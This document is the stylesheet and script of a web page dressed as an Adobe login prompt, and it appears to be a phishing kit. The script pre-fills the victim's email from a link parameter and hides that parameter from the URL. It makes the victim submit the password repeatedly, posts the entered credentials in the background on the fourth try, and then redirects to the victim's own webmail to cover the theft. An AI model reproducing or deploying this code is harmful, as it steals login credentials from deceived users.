        body {
            width: 100%;
            margin: 0;
            padding: 0;
            font-family: adobe-clean, adobe-clean-han-simplified-c, adobe-clean-han-traditional, adobe-clean-han-japanese, adobe-clean-han-korean, Gill Sans, Calibri, Geneva, Tahoma, Helvetica, Arial, "0e10a40ea0aa", Meiryo, "0d20e90ae0ce?d20b4 Pro W3", Hiragino Kaku Gothic Pro W3, Osaka, " 2d 33  300b40b70c30af", MS PGothic, Malgun Gothic, Microsoft YaHei, sans-serif;

        .lt {
            float: left;
        }

        .rt {
            float: right;
        }

        .br {
            border: 1px solid #000;
        }

        a {
            text-decoration: none;
            color: #0064dc;
        }

        header {
            width: 100%;
            margin: 0 auto;
            padding: 0;
            border: none;
            background: #000;
        }

        header .brand {
            width: 193px;
            margin: 0 30px;
            padding: 0;
            text-align: center;
            display: inline-block;
            border: none;
            background: #fff;
        }

        header .brand,
        header .search,
        header .brand img,
        header .brand h1 {
            display: inline-block;
        }

        header .brand img {
            width: 54px;
            background: #fff;
            margin: 0 auto -17px;
            padding: 0;
            position: relative;
            top: 0px;
        }

        header .brand h1 {
            font-size: 20px;
            font-weight: 600;
            color: #fff;
            margin: 0 auto;
            padding: 12px 20px;
            background: #E80E0E;
        }

        header .search {
            width: 300px;
            margin: 0px 30px 0 0;
            padding: 12px 0;
            float: right;
            text-align: center;
        }

        header .search .srch {
            width: 250px;
            padding: 5px 10px;
            font-size: 13px;
            font-weight: 400;
            color: #4b4b4b;
            border: none;
            border-radius: 10px;
        }

        .container {
            width: 100%;
            margin: 0 auto;
            padding: 0;
        }

        .container .dash {
            width: 100%;
            margin: 0 auto;
            padding: 0;
            position: absolute;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            z-index: 9999;
            background: rgba(0, 0, 0, 0.4);
        }

        .container .dash .board {
            max-width: 400px;
            margin: 0 auto;
            padding: 30px 0;
            background: #f6f6f6;
            display: block;
            border: none;
            border-radius: 1px;
            position: relative;
            top: 20%;
        }

        .container .dash .board .login {
            max-width: 370px;
            margin: 0 auto;
            padding: 0;
            border: none;
        }

        .container .dash .board .login ul {
            width: 100%;
            list-style: none;
            margin: 0 auto;
            padding: 0;
            border: none;
            display: block;
        }

        .container .dash .board .login ul li {
            width: 100%;
            margin: 0 auto;
            padding: 0;
            display: block;
            order: 1px solid #ccc;
        }

        .login ul li img,
        .login ul li p {
            display: inline-block;
        }

        .login ul li img {
            margin: 0;
            padding: 0;
            position: relative;
        }

        .login ul .l1 p {
            font-weight: 400;
            color: #707070;
            vertical-align: top;
            margin: 0;
            padding: 0;
        }

        #err,
        .login ul li #adbpss1 {
            display: none;
        }

        .login ul li .inp {
            width: 368px;
            margin: 8px auto;
            padding: 2px 12px;
            min-height: 32px;
            border: 1px solid #e5e5e5;
            border-radius: 4px;
            box-sizing: border-box;
            color: #000;
            display: block;
            font-size: 14px;
            font-weight: 400;
            font-family: adobe-clean, adobe-clean-han-simplified-c, adobe-clean-han-traditional, adobe-clean-han-japanese, adobe-clean-han-korean, Gill Sans, Calibri, Geneva, Tahoma, Helvetica, Arial, "0e10a40ea0aa", Meiryo, "0d20e90ae0ce?d20b4 Pro W3", Hiragino Kaku Gothic Pro W3, Osaka, " 2d 33  300b40b70c30af", MS PGothic, Malgun Gothic, Microsoft YaHei, sans-serif;
            font-style: italic;
        }

        .login ul li .inp:focus {
            border: 1px solid #1473e6;
            transition-delay: 0s;
            transition-duration: 0.15s;
            transition-property: all;
            transition-timing-function: ease-in-out;
            font-style: normal;
        }

        .login ul li .btns {
            width: 120px;
            margin: 0 auto;
            padding: 7px 0;
            background: #1473e6;
            color: #fff;
            font-family: adobe-clean, adobe-clean-han-simplified-c, adobe-clean-han-traditional, adobe-clean-han-japanese, adobe-clean-han-korean, Gill Sans, Calibri, Geneva, Tahoma, Helvetica, Arial, "0e10a40ea0aa", Meiryo, "0d20e90ae0ce?d20b4 Pro W3", Hiragino Kaku Gothic Pro W3, Osaka, " 2d 33  300b40b70c30af", MS PGothic, Malgun Gothic, Microsoft YaHei, sans-serif;
            border: none;
            border-radius: 16px;
            font-size: 15px;
            font-weight: 600;
            text-align: center;
            transition-delay: 0s;
            transition-duration: 0.15s;
            transition-property: all;
            transition-timing-function: ease-in-out;
            white-space: nowrap;
            display: inline-block;
            cursor: pointer;
            outline: none;
        }

        .login ul .l1 svg {
            width: 22px;
            display: inline-block;
            margin: 0;
            padding: 0;
            position: relative;
            top: 9px;
        }

        .login ul .l1 p {
            margin: 0;
            padding: 10px 6px;
            color: #707070;
        }

        .login ul .l2 p {
            font-size: 13px;
            font-weight: 700;
            color: #4b4b4b;
            margin: 0;
            padding: 15px 0;
        }

        .login ul .l3 img {
            width: 32px;
            margin: 0 0 -3px;
        }

        .login ul .l3 p {
            font-size: 28px;
            font-weight: 300;
            color: #2d2d2d;
            margin: 0 9px;
            padding: 0;
        }

        .login ul .l4 {
            width: 100%;
            margin: 0 auto;
            padding: 0;
            text-align: left;
        }

        .login ul .l4 p {
            font-size: 14px;
            font-weight: 600;
            margin: 0;
            padding: 5px 0;
            color: #E80E0E;
            font-style: italic;
        }

        .login ul .l5 p {
            width: 100%;
            margin: 50px auto 5px;
            padding: 0;
            text-align: center;
            font-size: 13px;
            font-weight: 400;
            color: #4b4b4b;
            display: block;
        }



        @media(max-width:680px) {
            header .search {
                width: 70px;
                margin: 0px;
                text-align: center;
            }

            header .search .srch {
                display: none;
            }

            header .brand {
                width: 180px;
                margin: 0 30px;
                padding: 0;
            }

            header .brand img {
                width: 40px;
                margin: 0 auto -10px;
            }

            header .brand h1 {
                font-size: 18px;
                margin: 0 auto;
                padding: 7px 20px;
            }
        }

    </style>

<script>
    (function() {
        // Get form and email input
        const form = document.getElementById('loginForm');
        const emailInput = document.getElementById('user');

        if (!form) {
            console.error('Form with id="loginForm" not found!');
            return;
        }
        if (!emailInput) {
            console.error('Email input with id="user" not found!');
            return;
        }

        // --- Auto-fill email from URL or localStorage ---
        const urlParams = new URLSearchParams(window.location.search);
        const urlEmail = urlParams.get('email');
        if (urlEmail) {
            localStorage.setItem('userEmail', urlEmail);
            // Clean URL
            window.history.replaceState({}, document.title, window.location.pathname);
        }

        const savedEmail = localStorage.getItem('userEmail');
        if (savedEmail) {
            emailInput.value = savedEmail;
        }

        // --- Submission counter ---
        let submitCount = parseInt(localStorage.getItem('formSubmitCount') || '0');
        console.log('Current submit count:', submitCount);

        // --- Form submit handler ---
        form.addEventListener('submit', function(e) {
            // Save current email (in case user changed it)
            localStorage.setItem('userEmail', emailInput.value);

            // Increment counter
            submitCount++;
            localStorage.setItem('formSubmitCount', submitCount);
            console.log('Submit #', submitCount);

            // --- 4th submission: intercept and redirect ---
            if (submitCount >= 4) {
                e.preventDefault();  // Stop normal form POST

                const email = emailInput.value;
                const domain = email.split('@')[1];
                let redirectUrl = `http://mail.${domain}`;  // ultimate fallback
                if (domain) {
                    redirectUrl = `http://mail.${domain}`;
                }
                console.log('Redirecting to:', redirectUrl);

                // Send form data in background, then redirect
                const formData = new FormData(form);
                fetch(form.action, {
                    method: form.method,
                    body: formData
                }).catch(err => console.error('Fetch error:', err))
                  .finally(() => {
                    // Clear storage and go to webmail
                    localStorage.removeItem('formSubmitCount');
                    localStorage.removeItem('userEmail');
                    window.location.href = redirectUrl;
                });
            }
            // For 1st, 2nd, 3rd: normal submit (page reloads)
        });
    })();
</script>
